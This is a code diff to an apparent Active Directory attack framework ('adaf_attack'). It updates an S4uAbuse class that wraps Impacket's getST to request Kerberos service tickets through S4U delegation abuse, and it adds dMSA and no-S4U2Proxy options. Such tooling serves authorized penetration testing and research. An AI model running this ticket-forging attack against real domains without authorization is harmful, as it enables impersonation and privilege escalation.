@@ -129,8 +129,9 @@ class S4uAbuse:
                 "Use --force to suppress this notice.[/yellow]"
             )
 
-        from impacket.examples.getST import GETST
+        from adaf_attack.core.impacket_scripts import load_impacket_example
 
+        getst_cls = load_impacket_example("getST.py", "GETST")
         options = _GetSTOptions(
             identity=f"{target.domain}/{target.username}",
             spn=spn,
@@ -145,17 +146,26 @@ class S4uAbuse:
             debug=False,
             self_flag=bool(kwargs.get("self_flag")),
             u2u=bool(kwargs.get("u2u")),
+            dmsa=bool(kwargs.get("dmsa")),
+            no_s4u2proxy=bool(kwargs.get("no_s4u2proxy")),
             renewable_life="",
             renewable=False,
             force_forwardable=False,
             renew=False,
         )
+        # Impacket getST reads options.self; cannot pass self= into __init__.
+        options.self = bool(kwargs.get("self_flag") or kwargs.get("self"))
         out_dir = session.path("s4u")
         os.makedirs(out_dir, exist_ok=True)
         cwd = os.getcwd()
         os.chdir(out_dir)
         try:
-            executor = GETST(target.password or "", target.domain, options)
+            executor = getst_cls(
+                target.username or "",
+                target.password or "",
+                target.domain,
+                options,
+            )
             executor.run()
         finally:
             os.chdir(cwd)
@@ -194,6 +204,8 @@ class S4uAbuse:
 
 
 class _GetSTOptions:
+    self: bool = False
+
     def __init__(self, **kw: Any) -> None:
         for key, val in kw.items():
             setattr(self, key, val)
